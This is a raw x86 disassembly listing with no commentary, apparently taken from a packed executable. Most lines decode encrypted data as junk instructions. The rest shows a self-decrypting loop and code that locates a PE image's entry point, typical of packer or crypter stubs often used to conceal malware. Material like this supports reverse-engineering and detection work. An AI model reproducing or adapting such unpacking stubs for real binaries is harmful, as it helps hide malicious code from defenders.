  4061b5:	iret   
  4061b6:	push   esi
  4061b7:	pop    esi
  4061b8:	mov    dl,0xdb
  4061ba:	sbb    al,BYTE PTR [ecx]
  4061bc:	sub    DWORD PTR [ebx-0xc],esp
  4061bf:	pop    esi
  4061c0:	push   esp
  4061c1:	popa   
  4061c2:	test   al,0x11
  4061c4:	jnp    0x4061c8
  4061c6:	add    ebx,DWORD PTR [edx-0x107500ab]
  4061cc:	stc    
  4061cd:	int3   
  4061ce:	xor    ah,ah
  4061d0:	inc    edx
  4061d1:	ss test esp,ebx
  4061d4:	xlat   BYTE PTR ds:[ebx]
  4061d5:	ret    0xbdd1
  4061d8:	jns    0x4061ce
  4061da:	repz jle 0x4061e7
  4061dd:	mov    esi,0xfe36a60d
  4061e2:	test   al,0x3a
  4061e4:	sbb    BYTE PTR [edi],ah
  4061e6:	xlat   BYTE PTR ds:[ebx]
  4061e7:	(bad)
  4061ea:	dec    edi
  4061eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061ec:	mov    ah,0xd3
  4061ee:	adc    eax,0xa91baf2
  4061f3:	push   es
  4061f4:	jle    0x4061e9
  4061f6:	push   eax
  4061f7:	loopne 0x40621e
  4061f9:	jns    0x406210
  4061fb:	addr16 xchg ah,dh
  4061fe:	push   edx
  4061ff:	loopne 0x4061f4
  406201:	test   DWORD PTR [ebx-0x41],0xc2dbbe1e
  406208:	mov    ah,0x25
  40620a:	xchg   ebx,eax
  40620b:	sbb    BYTE PTR [ecx],bh
  40620d:	mov    esp,0x292ddefc
  406212:	mov    eax,0x9b58e5de
  406217:	cmp    dl,BYTE PTR [edi]
  406219:	inc    esi
  40621a:	lds    esp,FWORD PTR [esi+ebx*8-0x25]
  40621e:	stos   BYTE PTR es:[edi],al
  40621f:	and    edx,DWORD PTR [ebx]
  406221:	into   
  406222:	fiadd  WORD PTR [edx+0x23959782]
  406228:	outs   dx,DWORD PTR ds:[esi]
  406229:	fisubr DWORD PTR [edi+0x6c]
  40622c:	fist   WORD PTR [esi]
  40622e:	icebp  
  40622f:	pop    eax
  406230:	shl    BYTE PTR [ebx+0x6d],1
  406233:	pop    esp
  406234:	push   0x7d
  406236:	(bad)  
  406237:	clc    
  406238:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406239:	pop    edi
  40623a:	fdiv   QWORD PTR [ebp+0x4]
  40623d:	mov    bh,0xd4
  40623f:	call   0x31f9:0x78bbbfe0
  406246:	xchg   esi,eax
  406247:	mov    cl,0x1d
  406249:	xor    DWORD PTR [ebx],esi
  40624b:	xchg   ebp,eax
  40624c:	cs in  eax,0xb8
  40624f:	mov    edx,0x25803605
  406254:	pop    ecx
  406255:	sbb    DWORD PTR [edi+0x199c638],edi
  40625b:	ja     0x4062ae
  40625d:	jb     0x406223
  40625f:	xchg   ecx,eax
  406260:	cwde   
  406261:	shr    BYTE PTR [ebx],cl
  406263:	sub    DWORD PTR [edx+0x555c3376],esi
  406269:	imul   ebp,eax,0x8768250d
  40626f:	add    eax,0xd58875fb
  406274:	adc    eax,0x504f467f
  406279:	loope  0x406215
  40627b:	xchg   edi,eax
  40627c:	jns    0x4062c7
  40627e:	bound  edi,QWORD PTR [edx+0xd66dec5]
  406284:	push   DWORD PTR [esi-0x54]
  406287:	shr    DWORD PTR [esi+0x6a],1
  40628a:	jns    0x406234
  40628c:	mov    ds:0xc59415e0,al
  406291:	inc    edi
  406292:	mov    ah,0x6f
  406294:	pop    esp
  406295:	push   edx
  406296:	mov    BYTE PTR [ebp+0x519c2580],dh
  40629c:	push   ebp
  40629d:	inc    edi
  40629e:	fisub  WORD PTR [esi-0x5]
  4062a1:	inc    ebx
  4062a2:	and    esp,DWORD PTR [edx]
  4062a4:	cmc    
  4062a5:	jecxz  0x4062c9
  4062a7:	pop    edx
  4062a8:	repz aam 0x72
  4062ab:	add    cl,0x2
  4062ae:	xchg   edx,eax
  4062af:	jo     0x4062de
  4062b1:	xchg   esp,eax
  4062b2:	int    0x97
  4062b4:	ret    
  4062b5:	inc    esp
  4062b6:	ds adc al,dl
  4062b9:	loope  0x406241
  4062bb:	icebp  
  4062bc:	aaa    
  4062bd:	(bad)  
  4062be:	mov    edx,0xaa246e69
  4062c3:	fwait
  4062c4:	retf   
  4062c5:	mov    edx,0xbb890b2f
  4062ca:	lahf   
  4062cb:	pop    edx
  4062cc:	retf   0xc8da
  4062cf:	std    
  4062d0:	sar    DWORD PTR [esi-0x78035b0d],0x38
  4062d7:	pop    ebx
  4062d8:	adc    ebp,DWORD PTR [eax]
  4062da:	fwait
  4062db:	dec    esi
  4062dc:	retf   0xb64e
  4062df:	out    dx,eax
  4062e0:	sahf   
  4062e1:	sub    ch,cl
  4062e3:	arpl   WORD PTR [ecx-0x44],si
  4062e6:	popa   
  4062e7:	push   ecx
  4062e8:	rol    BYTE PTR [esi+esi*4+0x73],1
  4062ec:	cwde   
  4062ed:	push   edx
  4062ee:	dec    ebx
  4062ef:	mov    ecx,0x83ab68c2
  4062f4:	imul   edi,ebx,0xffffffd5
  4062f7:	mov    bh,0x91
  4062f9:	dec    esp
  4062fa:	les    ebx,FWORD PTR [ebp-0x25]
  4062fd:	mov    ch,0x12
  4062ff:	mov    eax,ds:0x353bce04
  406304:	das    
  406305:	jno    0x40629b
  406307:	xlat   BYTE PTR ds:[ebx]
  406308:	out    dx,eax
  406309:	imul   ebx,ecx,0x13
  40630c:	(bad)  
  40630d:	shr    BYTE PTR [edx-0xa1a79ed],1
  406313:	pop    esi
  406314:	in     al,0x7c
  406316:	popa   
  406317:	inc    ebx
  406318:	mov    dl,0xb9
  40631a:	rcl    DWORD PTR [ebx+eax*2+0x5a6ff9e2],0x8e
  406322:	out    0xf8,al
  406324:	outs   dx,DWORD PTR ds:[esi]
  406325:	or     DWORD PTR [esi+0x3898cd62],edi
  40632b:	int    0xa0
  40632d:	jp     0x40639a
  40632f:	xor    BYTE PTR [eax-0x128292a5],bh
  406335:	es jp  0x40634a
  406338:	push   edx
  406339:	adc    eax,0x59012d0b
  40633e:	xor    ch,0xb
  406341:	ins    DWORD PTR es:[edi],dx
  406342:	ins    DWORD PTR es:[edi],dx
  406343:	data16 cld 
  406345:	mov    eax,ds:0xd56332c6
  40634a:	push   es
  40634b:	pop    eax
  40634c:	pusha  
  40634d:	rcr    esp,0x6f
  406350:	mov    eax,ds:0x3551609
  406355:	fisttp QWORD PTR [esi+0x78]
  406358:	fmul   QWORD PTR [eax-0x73]
  40635b:	jbe    0x406390
  40635d:	(bad)  
  40635e:	out    0x53,al
  406360:	aaa    
  406361:	sbb    al,0xdc
  406363:	xchg   edi,eax
  406364:	mov    al,0xf6
  406366:	int    0xff
  406368:	mov    BYTE PTR [esi],ch
  40636a:	jbe    0x4063df
  40636c:	inc    edi
  40636d:	add    al,0xcd
  40636f:	push   ss
  406370:	mov    esi,0x9389837a
  406375:	rcr    dl,1
  406377:	adc    BYTE PTR [esi+esi*8],cl
  40637a:	aad    0x4a
  40637c:	cmc    
  40637d:	in     eax,dx
  40637e:	mov    bl,BYTE PTR [edx]
  406380:	cmp    al,0xa3
  406382:	stos   DWORD PTR es:[edi],eax
  406383:	sub    DWORD PTR [esp+ebp*1-0x765f627],ebx
  40638a:	jle    0x4063ce
  40638c:	retf   0x31d3
  40638f:	or     eax,0x6ee081b
  406394:	shl    BYTE PTR [ebp-0x5],0x21
  406398:	sub    BYTE PTR [ebx-0x207f2a57],bh
  40639e:	clc    
  40639f:	stc    
  4063a0:	xchg   DWORD PTR [ebp-0x70e3e6f0],eax
  4063a6:	dec    ebp
  4063a7:	lock xor dh,ch
  4063aa:	(bad)  
  4063ab:	pop    ds
  4063ac:	mul    BYTE PTR [ebp+0x63]
  4063af:	outs   dx,DWORD PTR ds:[esi]
  4063b0:	dec    edi
  4063b1:	and    eax,0xa812a5e6
  4063b6:	(bad)  
  4063b7:	pop    ebp
  4063b8:	and    edi,ebp
  4063ba:	xchg   esi,eax
  4063bb:	ss push cs
  4063bd:	in     al,dx
  4063be:	push   ecx
  4063bf:	int    0x2
  4063c1:	dec    ebx
  4063c2:	loop   0x406386
  4063c4:	sub    al,0xb8
  4063c6:	sub    DWORD PTR [ecx+0x5fbf7eb3],eax
  4063cc:	mov    ebx,0xcb744477
  4063d1:	out    0xb7,eax
  4063d3:	jbe    0x4063dc
  4063d9:	mov    edx,DWORD PTR [ebp-0x3c]
  4063dc:	mov    edi,DWORD PTR [ebp-0x4]
  4063df:	xor    edi,eax
  4063e1:	xor    edx,eax
  4063e3:	add    edi,ecx
  4063e5:	add    edx,ecx
  4063e7:	imul   edx,edi
  4063ea:	mov    DWORD PTR [ebp+0xc],edx
  4063ed:	mov    edx,DWORD PTR [ebp+0xc]
  4063f0:	mov    DWORD PTR [ebp-0x24],edx
  4063f3:	mov    edx,DWORD PTR [ebp-0x8]
  4063f6:	add    edx,DWORD PTR [ebp-0x40]
  4063f9:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  406400:	mov    DWORD PTR [ebp-0x1c],edx
  406403:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  40640a:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  406411:	mov    edx,DWORD PTR [ebp-0x18]
  406414:	xor    edx,eax
  406416:	add    edx,ecx
  406418:	jmp    0x4067df
  40641d:	mov    edx,DWORD PTR [ebp-0x18]
  406420:	xor    edx,eax
  406422:	add    edx,DWORD PTR [ebp-0x14]
  406425:	mov    edi,DWORD PTR [ebp-0x1c]
  406428:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  40642f:	mov    BYTE PTR [ebp+0xf],dl
  406432:	mov    edx,DWORD PTR [ebp-0xc]
  406435:	xor    edx,eax
  406437:	add    edx,DWORD PTR [ebp-0x14]
  40643a:	mov    edi,DWORD PTR [ebp-0x1c]
  40643d:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  406444:	mov    BYTE PTR [ebp+0xb],dl
  406447:	mov    dl,BYTE PTR [ebp+0xf]
  40644a:	mov    edi,DWORD PTR [ebp-0xc]
  40644d:	jmp    0x4067a7
  406452:	pop    esi
  406453:	xlat   BYTE PTR ds:[ebx]
  406454:	pop    edi
  406455:	jmp    0x4064ce
  406457:	jae    0x4064c3
  406459:	push   ebx
  40645a:	jmp    0x4064aa
  40645c:	cmc    
  40645d:	pop    ss
  40645e:	jecxz  0x40647c
  406460:	cdq    
  406461:	mov    bl,0xa5
  406463:	cmp    BYTE PTR [esi+0x7e],bh
  406466:	xor    edi,DWORD PTR [ebp+0x7e]
  406469:	jle    0x406484
  40646b:	adc    DWORD PTR [ebx],edi
  40646d:	and    eax,0x996fdd6d
  406472:	or     dl,ch
  406474:	mov    dh,0xac
  406476:	clc    
  406477:	inc    eax
  406478:	sbb    DWORD PTR [ecx+0xe32b7d6],esp
  40647e:	idiv   DWORD PTR [edi+0xb981f31]
  406484:	push   ebx
  406485:	mov    ah,0xf
  406487:	lods   al,BYTE PTR ds:[esi]
  406488:	dec    esi
  406489:	lock ja 0x4064c2
  40648c:	cmc    
  40648d:	fcom   QWORD PTR [edi-0x2d1bc5b]
  406493:	adc    eax,0x3023fc52
  406498:	(bad)  
  406499:	mov    cl,0xcf
  40649b:	or     DWORD PTR [edi],0x75d6cbd3
  4064a1:	mov    BYTE PTR [ebx+0x0],dh
  4064a4:	jbe    0x406484
  4064a6:	shr    DWORD PTR [ebx+0x1c],0x3f
  4064aa:	and    DWORD PTR [ecx+0x20],edx
  4064ad:	push   eax
  4064ae:	dec    ebp
  4064af:	int3   
  4064b0:	adc    BYTE PTR [edi+0x5924575f],ah
  4064b6:	(bad)  
  4064b7:	mov    bh,0xd7
  4064b9:	mov    bl,0xe1
  4064bb:	lahf   
  4064bc:	sub    edi,ebx
  4064be:	repz repnz test DWORD PTR [esi+0x17c6368d],ebx
  4064c6:	cmp    DWORD PTR [ecx-0x4f43ad43],esp
  4064cc:	outs   dx,DWORD PTR ds:[esi]
  4064cd:	sbb    al,BYTE PTR [esi-0x14]
  4064d0:	stos   BYTE PTR es:[edi],al
  4064d1:	mov    ebp,0x7a9b23a5
  4064d6:	adc    al,dh
  4064d8:	ds push ebx
  4064da:	mov    edx,0x7c16e86b
  4064df:	mov    BYTE PTR [ebx+eiz*4-0x779fd2fc],dh
  4064e6:	ficom  WORD PTR [edx+0x5b]
  4064e9:	jmp    0x4064a3
  4064eb:	test   al,0x38
  4064ed:	or     dh,ah
  4064ef:	jge    0x4064bb
  4064f1:	mov    ?,WORD PTR [ebp+eiz*1-0x1a0560e8]
  4064f8:	pop    esp
  4064f9:	sar    DWORD PTR [esi-0x5c253d17],1
  4064ff:	sub    al,0xd5
  406501:	ret    0xd520
  406504:	adc    BYTE PTR [eax-0x6c],dl
  406507:	mov    edx,0x25b39f40
  40650c:	mov    ebx,0xd4626f25
  406511:	ins    DWORD PTR es:[edi],dx
  406512:	pop    ss
  406513:	mov    ds:0x362caa6,al
  406518:	and    eax,0x6d63947d
  40651d:	jne    0x40654b
  40651f:	mov    esi,0xd8c2acb5
  406524:	leave  
  406525:	(bad)  
  406526:	sbb    DWORD PTR [ebx],esi
  406528:	add    esp,ebp
  40652a:	push   cs
  40652b:	fwait
  40652c:	sub    eax,0x4f21722d
  406531:	adc    eax,0xfe323d1a
  406536:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406537:	stos   DWORD PTR es:[edi],eax
  406538:	popa   
  406539:	rcl    bl,1
  40653b:	cwde   
  40653c:	sub    BYTE PTR [ecx-0x65511579],ah
  406542:	xchg   edx,eax
  406543:	in     al,0x51
  406545:	call   0xaeb9:0x2f1f40e5
  40654c:	loopne 0x40651b
  40654e:	mov    ds:0x87a563b5,eax
  406553:	mov    ebp,0x809d0348
  406558:	jle    0x406577
  40655a:	pop    ecx
  40655b:	mov    bl,0x84
  40655d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40655e:	cdq    
  40655f:	fistp  DWORD PTR [edi-0x3e]
  406562:	fs jg  0x4064f1
  406565:	leave  
  406566:	aaa    
  406567:	mov    edi,0xc2f42b8e
  40656c:	pop    ss
  40656d:	jne    0x406557
  40656f:	ss ins BYTE PTR es:[edi],dx
  406571:	es pop ds
  406573:	iret   
  406574:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406575:	push   ebx
  406576:	inc    ecx
  406577:	inc    ecx
  406578:	(bad)  
  406579:	dec    esp
  40657a:	mov    ebx,0xd1459ee3
  40657f:	call   0x69192e1b
  406584:	mov    edx,0xb9764a9c
  406589:	bound  edx,QWORD PTR [eax+ecx*8-0x38]
  40658d:	(bad)  
  40658e:	and    ebp,DWORD PTR [esi]
  406590:	dec    esi
  406591:	(bad)  
  406593:	popf   
  406594:	stos   BYTE PTR es:[edi],al
  406595:	mov    al,0x40
  406597:	call   DWORD PTR [edi+ecx*8]
  40659a:	dec    edi
  40659b:	mov    bl,0xf0
  40659d:	shl    BYTE PTR [ecx+0x46],cl
  4065a0:	iret   
  4065a1:	sub    BYTE PTR [eax-0x5556733c],bh
  4065a7:	cmp    esi,DWORD PTR [eax]
  4065a9:	and    BYTE PTR [eax],0xb8
  4065ac:	dec    esi
  4065ad:	mov    edx,fs
  4065af:	aaa    
  4065b0:	mov    es,WORD PTR [eax]
  4065b2:	jns    0x406562
  4065b4:	add    edi,DWORD PTR [eax]
  4065b6:	mov    eax,0xafcac825
  4065bb:	adc    ah,ah
  4065bd:	aaa    
  4065be:	ret    0x98e3
  4065c1:	jo     0x4065a3
  4065c3:	pop    esi
  4065c4:	out    dx,al
  4065c5:	mov    ebp,0x4b664af5
  4065ca:	gs cmp eax,0x60d3d40e
  4065d0:	push   0x41
  4065d2:	loope  0x4065c5
  4065d4:	out    dx,al
  4065d5:	cs push esp
  4065d7:	adc    eax,0x6e18be0e
  4065dc:	into   
  4065dd:	xlat   BYTE PTR ds:[ebx]
  4065de:	popf   
  4065df:	cwde   
  4065e0:	jne    0x4065a6
  4065e2:	and    edx,esi
  4065e4:	fnstsw WORD PTR [edi+eax*1+0x18]
  4065e8:	inc    ecx
  4065e9:	clc    
  4065ea:	das    
  4065eb:	pusha  
  4065ec:	sbb    ah,bh
  4065ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065ef:	push   ds
  4065f0:	mov    cl,0x96
  4065f2:	mov    al,ds:0xf141f00f
  4065f7:	sub    eax,0x593372cb
  4065fc:	mov    BYTE PTR [edi-0x2ad44847],ah
  406602:	mov    DWORD PTR [esi-0x48],edi
  406605:	retf   
  406606:	xor    esp,DWORD PTR [eax-0x40]
  406609:	dec    ecx
  40660a:	cmp    eax,0xb1cb3862
  40660f:	dec    ebp
  406610:	pop    ebp
  406611:	jae    0x406689
  406613:	(bad)  
  406614:	add    al,0xec
  406616:	dec    esp
  406617:	add    al,0xb3
  40661a:	loope  0x4065e3
  40661c:	inc    eax
  40661d:	xchg   edx,eax
  40661e:	add    ah,BYTE PTR [esi-0x5e]
  406621:	lods   al,BYTE PTR ds:[esi]
  406622:	popf   
  406623:	sbb    BYTE PTR [edi+edx*4-0x16],bh
  406627:	fwait
  406628:	add    BYTE PTR [edi],bl
  40662a:	ds lock ins DWORD PTR es:[edi],dx
  40662d:	jne    0x406628
  40662f:	stc    
  406630:	test   al,0x0
  406633:	hlt    
  406634:	imul   edi,DWORD PTR [ebp-0x2b],0xffffffe2
  406638:	jmp    0x4065e1
  40663a:	xor    al,0x34
  40663c:	outs   dx,BYTE PTR ds:[esi]
  40663d:	sub    dl,dl
  40663f:	retf   
  406640:	outs   dx,BYTE PTR ds:[esi]
  406641:	mov    ecx,0x3ad736d1
  406646:	(bad)  
  406647:	jl     0x4065dc
  406649:	or     bh,BYTE PTR [edi+0x2d]
  40664c:	push   edx
  40664d:	xor    bh,BYTE PTR [ebp-0x4f]
  406650:	retf   
  406651:	leave  
  406652:	cmc    
  406653:	mov    eax,0x76e805b1
  406658:	lods   al,BYTE PTR ds:[esi]
  406659:	sub    dh,BYTE PTR [edx]
  40665b:	inc    edi
  40665c:	jle    0x4066c0
  40665e:	xor    eax,0x5ec660f9
  406663:	retf   
  406664:	adc    DWORD PTR [esi+0x3363379f],0x43
  40666b:	inc    eax
  40666c:	mov    ds:0x9c1bc755,al
  406671:	sbb    ch,BYTE PTR [ecx]
  406673:	xor    DWORD PTR [edi-0x22720ad9],eax
  406679:	pop    ds
  40667a:	push   edi
  40667b:	dec    BYTE PTR [ebx+eax*4+0x4a]
  40667f:	cmp    eax,0x51e279ff
  406684:	xchg   ebx,eax
  406685:	ror    ch,1
  406687:	in     eax,dx
  406688:	test   al,0x84
  40668a:	mov    ds:0x67ae10ac,eax
  40668f:	cld    
  406690:	das    
  406691:	mov    al,BYTE PTR [eax]
  406693:	push   eax
  406694:	pop    ss
  406695:	inc    ebp
  406696:	xor    BYTE PTR [edx-0x7a],ch
  406699:	push   cs
  40669a:	(bad)  
  40669b:	fiadd  WORD PTR [ebp+0x6298d76e]
  4066a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066a2:	(bad)  
  4066a3:	in     eax,0xe6
  4066a5:	add    DWORD PTR [ebx+0xb],ebx
  4066a8:	ret    0x7155
  4066ab:	sub    ah,dl
  4066ad:	out    0x21,eax
  4066af:	and    BYTE PTR [ecx],al
  4066b1:	in     eax,0xa1
  4066b3:	add    edi,DWORD PTR ds:0xea7bc80b
  4066b9:	and    eax,0x34c4802d
  4066be:	jne    0x406669
  4066c0:	mov    dl,0x48
  4066c2:	xlat   BYTE PTR ds:[ebx]
  4066c3:	add    esp,edi
  4066c5:	jo     0x406711
  4066c7:	pop    ds
  4066c8:	in     al,0x97
  4066ca:	lock loopne 0x406685
  4066cd:	jnp    0x4066d1
  4066cf:	out    0x12,al
  4066d1:	out    0xe8,al
  4066d3:	jp     0x406699
  4066d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066d6:	in     eax,0x52
  4066d8:	shl    ch,1
  4066da:	jns    0x4066fe
  4066dc:	scas   al,BYTE PTR es:[edi]
  4066dd:	push   cs
  4066de:	pop    ecx
  4066df:	stos   DWORD PTR es:[edi],eax
  4066e0:	add    al,0xcf
  4066e2:	pushf  
  4066e3:	mov    ds:0xe36c6d21,al
  4066e8:	push   cs
  4066e9:	hlt    
  4066ea:	push   esi
  4066eb:	sbb    eax,0x2f996e8
  4066f0:	push   ebp
  4066f1:	sub    esp,ebx
  4066f3:	mov    BYTE PTR [edx],0x51
  4066f6:	sub    esi,DWORD PTR [edi]
  4066f8:	pop    ds
  4066f9:	or     dl,ah
  4066fb:	mov    dl,BYTE PTR [esi+0x53]
  4066fe:	jae    0x4066c5
  406700:	mov    eax,0x520bfc5f
  406705:	pop    ecx
  406706:	add    DWORD PTR [edi+0x29],ebp
  406709:	mov    ah,0x26
  40670b:	imul   edx,DWORD PTR [ecx+0x5c28af4f],0xffffffb1
  406712:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406713:	xchg   BYTE PTR [edx],dh
  406715:	fwait
  406716:	loope  0x4066e2
  406718:	nop
  406719:	push   cs
  40671a:	fadd   DWORD PTR [ecx-0x4c]
  40671d:	add    al,0xca
  40671f:	or     BYTE PTR [eax+0x5b],dl
  406722:	(bad)  
  406724:	cmc    
  406725:	or     eax,0xd3fc350f
  40672a:	xlat   BYTE PTR ds:[ebx]
  40672b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40672c:	xchg   esp,ebp
  40672e:	popa   
  40672f:	retf   0xced7
  406732:	rcl    BYTE PTR [eax-0x66],1
  406735:	cli    
  406736:	sub    ah,BYTE PTR [edi-0x6b7c9bcd]
  40673c:	aam    0x0
  40673e:	cmp    DWORD PTR [edi],edi
  406740:	sub    dl,cl
  406742:	dec    edi
  406743:	enter  0xbf94,0xfc
  406747:	mov    cl,0x78
  406749:	mov    bl,0xa5
  40674b:	add    DWORD PTR [ebp+edx*1+0x1dc2226f],eax
  406752:	das    
  406753:	sbb    esp,eax
  406755:	(bad)  
  406756:	repnz pop eax
  406758:	push   ebp
  406759:	aam    0x59
  40675b:	fdiv   st(1),st
  40675d:	and    edi,DWORD PTR [edi]
  40675f:	aam    0xd8
  406761:	or     dh,ch
  406763:	cmp    eax,0xcd654d0e
  406768:	pushf  
  406769:	inc    esi
  40676a:	not    DWORD PTR [edi+eiz*2-0x7]
  40676e:	mov    dh,BYTE PTR [esi-0x4e214bcc]
  406774:	dec    edi
  406775:	cmp    BYTE PTR [esi],bl
  406777:	mov    eax,0x3641564d
  40677c:	pop    es
  40677d:	pop    DWORD PTR [ecx]
  40677f:	imul   BYTE PTR ds:0xb77e91f7
  406785:	mov    eax,0x609ee490
  40678a:	push   ss
  40678b:	cwde   
  40678c:	imul   edi,DWORD PTR [esi+0x62d2a948],0x2a0cbbd8
  406796:	das    
  406797:	or     BYTE PTR [edx],dh
  406799:	pop    esi
  40679a:	xchg   esp,eax
  40679b:	hlt    
  40679c:	fcmovnu st,st(2)
  40679e:	inc    edi
  40679f:	sbb    al,0xff
  4067a2:	cdq    
  4067a3:	(bad)  
  4067a4:	ja     0x4067bc
  4067a6:	das    
  4067a7:	xor    edi,eax
  4067a9:	add    edi,DWORD PTR [ebp-0x14]
  4067ac:	mov    ebx,DWORD PTR [ebp-0x1c]
  4067af:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4067b6:	mov    dl,BYTE PTR [ebp+0xb]
  4067b9:	mov    edi,DWORD PTR [ebp-0x18]
  4067bc:	xor    edi,eax
  4067be:	add    edi,DWORD PTR [ebp-0x14]
  4067c1:	mov    ebx,DWORD PTR [ebp-0x1c]
  4067c4:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4067cb:	mov    edx,DWORD PTR [ebp-0x44]
  4067ce:	mov    edi,DWORD PTR [ebp-0xc]
  4067d1:	xor    edx,eax
  4067d3:	xor    edi,eax
  4067d5:	add    edx,ecx
  4067d7:	add    edi,ecx
  4067d9:	imul   edx,edi
  4067dc:	add    edx,DWORD PTR [ebp-0x14]
  4067df:	mov    DWORD PTR [ebp-0x14],edx
  4067e2:	mov    edx,DWORD PTR [ebp-0xc]
  4067e5:	mov    edi,DWORD PTR [ebp-0x24]
  4067e8:	xor    edx,eax
  4067ea:	add    edx,ecx
  4067ec:	imul   edx,edi
  4067ef:	mov    edi,DWORD PTR [ebp-0xc]
  4067f2:	xor    edi,eax
  4067f4:	sub    edx,edi
  4067f6:	mov    edi,DWORD PTR [ebp-0xc]
  4067f9:	mov    ebx,DWORD PTR [ebp-0x14]
  4067fc:	xor    edi,eax
  4067fe:	add    edi,ecx
  406800:	imul   edi,ebx
  406803:	mov    ebx,DWORD PTR [ebp-0x18]
  406806:	xor    ebx,eax
  406808:	sub    edx,ecx
  40680a:	lea    edi,[edi+ebx*1+0x32729b]
  406811:	cmp    edi,edx
  406813:	jbe    0x40641d
  406819:	mov    edx,DWORD PTR [ebp-0xc]
  40681c:	mov    edi,DWORD PTR [ebp-0x24]
  40681f:	xor    edx,eax
  406821:	add    edx,ecx
  406823:	imul   edx,edi
  406826:	mov    edi,DWORD PTR [ebp-0x18]
  406829:	xor    edi,eax
  40682b:	add    edx,edi
  40682d:	mov    edi,DWORD PTR [ebp-0x8]
  406830:	lea    edx,[edx+edi*1+0x32729b]
  406837:	mov    DWORD PTR [ebp-0x8],edx
  40683a:	mov    edx,DWORD PTR [ebp-0x20]
  40683d:	xor    edx,eax
  40683f:	mov    edi,0xffcd8d65
  406844:	sub    edi,edx
  406846:	add    edi,DWORD PTR [ebp-0x10]
  406849:	mov    edx,DWORD PTR [ebp-0x20]
  40684c:	mov    ebx,DWORD PTR [ebp-0x8]
  40684f:	xor    edx,eax
  406851:	add    edx,ecx
  406853:	imul   edx,ebx
  406856:	cmp    edx,edi
  406858:	jbe    0x40501f
  40685e:	pop    ebx
  40685f:	pop    edi
  406860:	leave  
  406861:	ret    0x8
  406864:	push   ebp
  406865:	mov    ebp,esp
  406867:	push   ecx
  406868:	mov    ecx,DWORD PTR ds:0x433747
  40686e:	mov    eax,ds:0x43375f
  406873:	sub    ecx,eax
  406875:	xor    ecx,DWORD PTR [ecx+eax*1]
  406878:	mov    ecx,DWORD PTR [ebp+0x8]
  40687b:	and    DWORD PTR ds:0x43366b,0x0
  406885:	jmp    0x406895
  40688a:	mov    eax,ds:0x43366b
  40688f:	inc    eax
  406890:	mov    ds:0x43366b,eax
  406895:	cmp    DWORD PTR ds:0x43366b,0x1d
  40689c:	jae    0x4068e6
  4068a2:	cmp    DWORD PTR ds:0x43366b,0xb
  4068a9:	jne    0x4068c9
  4068af:	push   0x8428
  4068b4:	push   0x433810
  4068b9:	push   0x433810
  4068be:	push   0x433767
  4068c3:	call   DWORD PTR ds:0x412378
  4068c9:	cmp    DWORD PTR ds:0x43366b,0xa
  4068d0:	jne    0x4068e1
  4068d6:	mov    eax,ds:0x43366b
  4068db:	inc    eax
  4068dc:	mov    ds:0x43366b,eax
  4068e1:	jmp    0x40688a
  4068e6:	mov    eax,0x7510854
  4068eb:	sbb    DWORD PTR ds:0x4336fb,0x433673
  4068f5:	xor    ecx,eax
  4068f7:	and    DWORD PTR ds:0x43372f,0x491f
  406901:	add    ecx,0x32729b
  406907:	mov    DWORD PTR ds:0x43361f,0x6297
  406911:	mov    DWORD PTR [ebp+0x10],ecx
  406914:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  40691b:	mov    ecx,0x4881
  406920:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  406927:	mov    ecx,0xf89c8532
  40692c:	push   esi
  40692d:	mov    DWORD PTR ds:0x4336b3,0x711c
  406937:	mov    DWORD PTR [ebp+0x10],0x70019f3
  40693e:	mov    DWORD PTR ds:0x433633,edi
  406944:	mov    esi,DWORD PTR [ebp-0x4]
  406947:	mov    DWORD PTR ds:0x4336b7,0x237d
  406951:	cmp    ecx,esi
  406953:	mov    DWORD PTR ds:0x4336f7,0x9b
  40695d:	je     0x406998
  406963:	and    DWORD PTR ds:0x433617,0x274d
  40696d:	mov    esi,DWORD PTR [ebp+0xc]
  406970:	xor    ecx,eax
  406972:	sub    DWORD PTR ds:0x4336c3,0x433613
  40697c:	xor    esi,eax
  40697e:	lea    ecx,[esi+ecx*1+0x32729b]
  406985:	xor    ecx,eax
  406987:	cmp    ecx,0xf89c8521
  40698d:	jne    0x40692d
  406993:	jmp    0x4069c6
  406998:	add    ecx,0xffcd8d65
  40699e:	mov    esi,ecx
  4069a0:	xor    esi,eax
  4069a2:	add    esi,DWORD PTR [ebp+0x8]
  4069a5:	mov    DWORD PTR [ebp+0x8],esi
  4069a8:	mov    esi,DWORD PTR [ebp+0x8]
  4069ab:	xor    esi,ecx
  4069ad:	xor    esi,eax
  4069af:	mov    eax,DWORD PTR [edx+0x194]
  4069b5:	mov    ecx,DWORD PTR [eax]
  4069b7:	mov    eax,DWORD PTR [ecx+0x3c]
  4069ba:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4069be:	add    eax,ecx
  4069c0:	mov    DWORD PTR [ebp+0x8],esi
  4069c3:	mov    DWORD PTR [ebp+0x10],eax
  4069c6:	mov    eax,DWORD PTR [ebp+0x10]
  4069c9:	pop    esi
  4069ca:	test   eax,eax
  4069cc:	jmp    0x406c4a
  4069d1:	gs aaa 
  4069d3:	jns    0x406a20
  4069d5:	dec    ecx
  4069d6:	jno    0x406a4d
  4069d8:	xor    DWORD PTR [ebp+0x166491c7],ecx
  4069de:	popa   
  4069df:	out    dx,al
  4069e0:	xchg   esp,eax
  4069e1:	data16 (bad) 
  4069e3:	jle    0x406a63
  4069e5:	fistp  QWORD PTR [esi+edi*2+0x7e]
